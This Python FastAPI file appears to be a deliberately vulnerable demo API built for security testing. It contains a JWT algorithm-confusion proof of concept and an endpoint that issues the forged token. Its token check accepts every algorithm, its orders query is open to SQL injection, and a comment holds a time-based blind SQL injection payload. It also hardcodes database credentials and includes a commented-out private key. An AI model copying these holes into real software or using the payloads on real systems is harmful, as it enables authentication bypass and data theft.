import base64
from pathlib import Path
from typing import Annotated

import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519
from fastapi import FastAPI, Depends, UploadFile, HTTPException
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from jwt import PyJWKClient, PyJWK
from sqlalchemy import Column, Integer, String, create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base

# use jwcrypto to create the jwks:
# https://matthewdavis111.com/jwks/creating-jwks-with-python/

# Generate ed25519 private key
# private_key = ed25519.Ed25519PrivateKey.generate()
# private_key = ed25519.Ed25519PrivateKey.from_private_bytes(
#     Path("private.pem").read_bytes()
# )
#
# # Get private key bytes as they would be stored in a file
# priv_key_bytes = private_key.private_bytes(
#     encoding=serialization.Encoding.PEM,
#     format=serialization.PrivateFormat.PKCS8,
#     encryption_algorithm=serialization.NoEncryption()
# )

# priv_key_bytes = b"""-----BEGIN PRIVATE KEY-----
# MHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49
# AwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk
# Ak3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==
# -----END PRIVATE KEY-----"""

priv_key_bytes = serialization.load_pem_private_key(
    Path("private.pem").read_bytes(), password=None
)

pub_key_bytes = Path("public.key").read_bytes()


def algo_confusion_poc():
    # Making a good jwt token that should work by signing it with the private key
    # encoded_good = jwt.encode({"test": 1234}, priv_key_bytes, algorithm="ES256")
    encoded_good = jwt.encode({"test": 1234}, Path("private.pem").read_bytes(), algorithm="EdDSA")

    # Using HMAC with the public key to trick the receiver to think that the public key is a HMAC secret
    encoded_bad = jwt.encode({"sub": "hahahahahhaah hacked!!"}, pub_key_bytes, algorithm="HS256")
    print("bad key: ", encoded_bad)

    # Both of the jwt tokens are validated as valid
    decoded_good = jwt.decode(encoded_good, pub_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())
    decoded_bad = jwt.decode(encoded_bad, pub_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())

    if decoded_good == decoded_bad:
        print("POC Successful")


algo_confusion_poc()

server = FastAPI()
Base = declarative_base()


class OrderModel(Base):
    __tablename__ = 'orders'

    id = Column(Integer, primary_key=True)
    product = Column(String, nullable=False)
    user = Column(String, nullable=False)


orders = [
    OrderModel(product='carrots', user='userA'),
    OrderModel(product='potatoes', user='userB'),
]

engine = create_engine('postgres+psycopg2://postgres:postgres@localhost:5432/postgres')
session_maker = sessionmaker(bind=engine)
Base.metadata.create_all(engine)


session = session_maker()
orders_query = session.query(OrderModel).all()
if not orders_query:
    for order in orders:
        session.add(order)
    session.commit()


order_records = session_maker().query(OrderModel).all()
for order in order_records:
    print(order.product)


@server.get("/.well-known/openid-configuration")
def oidc_discovery():
    return {
        "issuer": "https://auth.apisec.ai",
        "authorization_endpoint": "https://auth.apisec.ai/auth",
        "token_endpoint": "https://auth.apisec.ai/token",
        "jwks_uri": "https://auth.apisec.ai/.well-known/jwks.json",
    }


jwk_set = {
        "keys": [
            {
                "use": "sig",
                "kid": "080E8CtRFAnnLlgK3dk8Y",
                "x": base64.b64encode(pub_key_bytes),
                "alg": "EdDSA"
            }
        ]
    }


@server.get("/.well-known/jwks.json")
def jwks():
    return jwk_set


@server.get("/orders")
def list_orders(filter: str):
    orders = session_maker().query(OrderModel).filter(
        # "user = '' or strpos((SELECT CASE WHEN 1=1 THEN pg_sleep(7) ELSE pg_sleep(0) END )::varchar(5), '1' ) = 0 ; --"
        f"user = '{filter}'"
    )
    print(str(orders))
    return {
        "orders": [{
            "product": order.product,
            "user": order.user
        } for order in orders.all()]
    }


def authorize_access(credentials: Annotated[HTTPAuthorizationCredentials, Depends(HTTPBearer())]):
    try:
        return jwt.decode(
            credentials.credentials,
            pub_key_bytes,
            algorithms=jwt.algorithms.get_default_algorithms()
        )
    except Exception as e:
        raise HTTPException(
            status_code=401, detail=f"Not authenticated, {e}"
        )


@server.get("/token")
def get_token():
    return {
        "token": jwt.encode({"sub": "1234"}, priv_key_bytes, algorithm="EdDSA")
    }


@server.get("/tampered-token")
def get_token():
    return jwt.encode({"sub": "hahahahahhaah hacked!!"}, pub_key_bytes, algorithm="HS256")


@server.get("/hello")
def hello():
    return "hello!"


@server.get("/protected")
def protected(user_claims: dict = Depends(authorize_access)):
    return f"you got access! {user_claims['sub']}"


@server.put("/upload")
def upload(file: UploadFile):
    print("uploaded!")
    return {"filename": file.filename}
